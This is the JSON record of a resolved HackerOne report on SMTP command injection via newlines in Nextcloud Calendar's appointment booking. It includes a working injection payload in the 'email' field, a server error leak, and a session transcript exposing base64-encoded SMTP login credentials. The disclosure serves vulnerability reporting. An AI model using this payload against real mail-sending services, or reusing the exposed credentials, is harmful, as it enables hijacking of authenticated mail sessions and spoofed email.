{
  "id": 1509216,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTA5MjE2",
  "url": "https://hackerone.com/reports/1509216",
  "title": "SMTP Command Injection in Appointment Emails via Newlines",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-03-13T12:24:28.376Z",
  "submitted_at": "2022-03-13T12:24:28.455Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "spaceraccoon",
    "url": "/spaceraccoon",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13291,
    "url": "https://hackerone.com/nextcloud",
    "handle": "nextcloud",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Nextcloud",
      "twitter_handle": "nextclouders",
      "website": "https://nextcloud.com",
      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-12-27T17:29:26.072Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-11-27T17:29:23.208Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nUsers can create appointment calendars for other users to book slots on their calendar. When booking a slot, the following request is made:\n\n```\nPOST /apps/calendar/appointment/1/book HTTP/2\nHost: 192.168.92.132\n\n{\"start\":1647306900,\"end\":\"1647307200\",\"displayName\":\"Test User\",\"email\":\"<BOOKING USER'S EMAIL>\",\"description\":\"Please accept!\\r\\n\",\"timeZone\":\"Asia/Singapore\"}\n```\n\nNext, a confirmation email with a confirmation link is sent to the user who booked the slot via `/var/www/nextcloud/apps/calendar/lib/Service/Appointments/BookingService.php` using the SMTP connection.\n\nThe SMTP connection involves the following messages:\n\n```\nEHLO nextcloud40gb\n250-smtp.gmail.com at your service, [116.89.6.224]\n250-SIZE 35882577\n250-8BITMIME\n250-STARTTLS\n250-ENHANCEDSTATUSCODES\n250-PIPELINING\n250-CHUNKING\n250 SMTPUTF8\nSTARTTLS\n220 2.0.0 Ready to start TLS\nEHLO nextcloud40gb\n250-smtp.gmail.com at your service, [116.89.6.224]\n250-SIZE 35882577\n250-8BITMIME\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\n250-ENHANCEDSTATUSCODES\n250-PIPELINING\n250-CHUNKING\n250 SMTPUTF8\nAUTH LOGIN\n334 VXNlcm5hbWU6\naGFja2Vyb25ldGVzdDEyMzRAZ21haWwuY29t\n334 UGFzc3dvcmQ6\nZHZob3Z1a3h0aWJrd2JhYg==\n235 2.7.0 Accepted\nMAIL FROM:<hackeronetest1234@gmail.com>\nRCPT TO:<BOOKING USER'S EMAIL>\nDATA\n250 2.1.0 OK u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp\n250 2.1.5 OK u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp\n354  Go ahead u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp\n\n.\n250 2.0.0 OK  1647162315 u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp\nQUIT\n221 2.0.0 closing connection u10-20020a056a00124a00b004f783abfa0esm10187854pfi.28 - gsmtp\n```\n\nUnfortunately, as newlines and special characters are not sanitized in the `email` value in the JSON request, a malicious attacker can inject newlines to break out of the `RCPT TO:<BOOKING USER'S EMAIL>` SMTP command and begin injecting arbitrary SMTP commands. Using several properties of the email RFC, an attacker can craft a payload that passes both the PHP validation of the email and the SwiftMail injection. These commands vary depending on the backend email server (Gmail, Outlook, local SMTP server) and thus can have different impacts, such as changing the `MAIL FROM` user, running sensitive commands like `QUEU` to view the current view, and so on. The errors in SMTP are returned in the response, thus making this a non-blind injection.\n\nFor example, an attacker can inject a simple `EHLO a` command to view information about the backend server:\n\n```\n{\"start\":1647306900,\"end\":\"1647307200\",\"displayName\":\"Test User\\r\\n\",\"email\":\"\\\">\\r\\nEHLO a\\r\\nRCPT TO:<a@a.com>\\\"@b.com\",\"description\":\"Please accept!\\r\\n\",\"timeZone\":\"Asia/Singapore\"}\n```\n\nWhich for Gmail would return:\n\n```\n{\"status\":\"error\",\"message\":\"Could not send mail: Expected response code 354 but got code \\\"250\\\", with message \\\"250-smtp.gmail.com at your service, [116.89.6.224]\\r\\n250-SIZE 35882577\\r\\n250-8BITMIME\\r\\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\\r\\n250-ENHANCEDSTATUSCODES\\r\\n250-PIPELINING\\r\\n250-CHUNKING\\r\\n250 SMTPUTF8\\r\\n\\\"\",\"data\":{\"type\":\"OCA\\\\Calendar\\\\Exception\\\\ServiceException\",\"message\":\"Could not send mail: Expected response code 354 but got code \\\"250\\\", with message \\\"250-smtp.gmail.com at your service, [116.89.6.224]\\r\\n250-SIZE 35882577\\r\\n250-8BITMIME\\r\\n250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH\\r\\n250-ENHANCEDSTATUSCODES\\r\\n250-PIPELINING\\r\\n250-CHUNKING\\r\\n250 SMTPUTF8\\r\\n\\\"\",\"code\":250,\n```\n\nThis leaks the backend IP addresses, SMTP server data, and so on.\n\n## Steps To Reproduce:\n\nNote: Email sending should be set up in the admin settings.\n\n  1. At https://<NEXTCLOUD IP>/apps/calendar, select the plus sign beside \"Appointments\" on the left sidebar and create an appointment calendar.\n  2. As another user, go to the link to the appointment booking for that calendar.\n  3. Fill up a booking and intercept the request. Change the `email` value to `\"email\":\"\\\">\\r\\nEHLO a\\r\\nRCPT TO:<a@a.com>\\\"@b.com\"`. This should inject an `EHLO` SMTP command which returns some debug information about the backend SMTP server.\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\n\n{F1653231}\n\n## Impact\n\nThe impact varies based on which commands are supported by the backend SMTP server. However, the main risk here is that the attacker can then hijack an already-authenticated SMTP session and run arbitrary SMTP commands as the email user, such as sending emails to other users, changing the FROM user, and so on.",
  "weakness": {
    "id": 69,
    "name": "CRLF Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1653231,
      "file_name": "nextcloud_injection.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/90fost5gfnwwkauel9d2l3xjx7x2?response-content-disposition=attachment%3B%20filename%3D%22nextcloud_injection.png%22%3B%20filename%2A%3DUTF-8%27%27nextcloud_injection.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6K7XUSGS%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142327Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA5oUTkOsy%2B%2BNZW%2FsEPkxVR9Nn0bKUQajhMaZJnQUOJJAiBNVU4iwU4izaH0MK0tElopJO3KoogTT8%2FbdWX%2FkbKzuyqyBQh2EAMaDDAxMzYxOTI3NDg0OSIMERsjeYIiXpoQB0OmKo8FUViIVri3eJCOgeD2QGMLKPs4F1%2FjbhNffMNUt%2BfvAGSphgvZY2tU246xkvKwwDTX6TnzUNLh3iGOcuouArS3RIWbEfHSiDDu6%2BVZPx3Wz1I%2FCwS%2BKPH5NwJsBp0BibvHEHHji%2FALBDiXO8PioToytjyaEQNaXmQuLAn84CAb4QekxzofZnprn52iHUoXFyJNf%2Fq3ZqvA4jb30mJAxCPIjnPde1tkpNSGuAfsmY%2ByQYlN7sWxpq5yV%2BTU%2Bz0rt1WjtctGsd6w1yt88Dd%2Br74P8m7ROn2Z0ptQw5A%2BWNmX1Wanb7ILpRxe8QeaZaokqgxiSrVfnWtNKgnVUga2Z0moK4hOWv539koLmT4PBBuxJlSyZWyeMoBemGmSCiOxOKwmrf%2BCK%2FG1BpNYsaCmjPVr2A49O9rh48uqEFc8uvejj87y8pQoGWAlFjsxe1QzTC0haaEIYGygiAnZI6IKmy2%2BNlrPwjgcdHQnc15lnYbAokFqg1uW1UzqkUE4c44dN5JbBhzJaJz14CGqvz2LbrkrxeapW3SunevCGGfJdcClV%2F0zJwxxOPm7TYbX7PHfVKaL7pLvGt6ShxVaeJzf1nAj8m2nfGj9L5WdfZ6Sb9aD7w08GXkqVBejxqPrEzu%2Fin49ua4mt8x0hItGe5i0jUq8p%2BuZQ93zKwP09dFgsV6qPlGtXKwW1fddd9jt%2Bnnp1fwfIxbu4spfYa8nFjzgPqH7T%2F%2FJQgaw6dXm%2Fi4%2FblBIP3pX1Sf8fOovW1YithPw4Jt%2FdibdeIaKPPXUhJeeypNj7zindWYEDmbdjQ6xKgYfOTCGv3Kveuz%2BrIe58j5hhTO6SOGM5oLaEPjukGlkwR0S6pSULxstSwXhSCM4K2grCjC%2Fvq2uBjqyASBnlNoKKu8wzQ1P%2F0BlH14PlBBt%2Fm%2BFzSC4hnyN21lioiA3qg372zbcFqxrMin8PkMDjYnDERYVShxZWmk7L62lyLmDmK6ddoZeeuZn0a%2BBvBT61yW5%2Fafe16Wi38LTWHakxXOTJqfqznIB1OO6RKIWbBpba3WDGpf5V64%2B0hKThL7teXpfRzoD3U%2BjQs%2B7q62Fy7YrQ7qeIWla%2FIkEaOKDajC8wFKHIsPw6ZwsIvBIndQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=003f3419022079aa744033db11088b5aadc2230272907bfa934f3fb383087b9c",
      "file_size": 746139,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2022-12-27T17:29:23.340Z",
  "allow_singular_disclosure_after": -35672043.72627869,
  "singular_disclosure_allowed": true,
  "vote_count": 25,
  "voters": [
    "wi11",
    "jumpydata",
    "shreyaschavhan",
    "abdo0x",
    "zy9ard3",
    "shubham_srt",
    "f_m",
    "h4x0r_dz",
    "sim4n6",
    "khizer47",
    "and 15 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 68217,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "nextcloud/calendar",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 141176,
      "category": "team",
      "content": "https://github.com/nextcloud/security-advisories/security/advisories/GHSA-8xv5-4855-24qf",
      "user": {
        "id": 2286231,
        "username": "anna_larch",
        "name": "Anna Larch",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2022-03-21T15:07:06.628Z",
        "url": "https://hackerone.com/anna_larch",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
